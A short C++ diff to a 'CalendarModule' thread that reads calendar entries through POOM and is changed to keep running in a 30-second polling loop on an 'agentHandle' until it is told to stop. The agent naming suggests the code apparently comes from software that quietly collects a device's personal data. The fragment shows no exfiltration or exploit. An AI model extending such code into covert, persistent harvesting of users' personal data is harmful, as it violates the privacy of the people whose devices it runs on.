@@ -18,18 +18,36 @@ DWORD WINAPI CalendarModule(LPVOID lpParam) {
 	DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module started\n", 5, FALSE);
 
 	if (poom->IsValid()) {
-		poom->Run(MODULE_ORGANIZER);
+		poom->Run(MODULE_CALENDAR	);
 	} else {
 		DBG_TRACE(L"Debug - Calendar.cpp - Calendar err 2 \n", 5, FALSE);
 		me->setStatus(MODULE_STOPPED);
 		return TRUE;
 	}
 
-
+	/*
 	DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module is Closing\n", 1, FALSE);
 	delete poom;
 
 	me->setStatus(MODULE_STOPPED);
+	*/
+
+	LOOP {
+
+		_WaitForSingleObject(agentHandle, 30000);
+
+		//AGGIORNO IL DB
+
+		if (me->shouldStop()) {
+			DBG_TRACE(L"Debug - Calendar.cpp - Calendar Module is Closing\n", 1, FALSE);
+			delete poom;
+
+			me->setStatus(MODULE_STOPPED);
+			return 0;
+		}
+	}
+
+
 	return 0;
 
 }
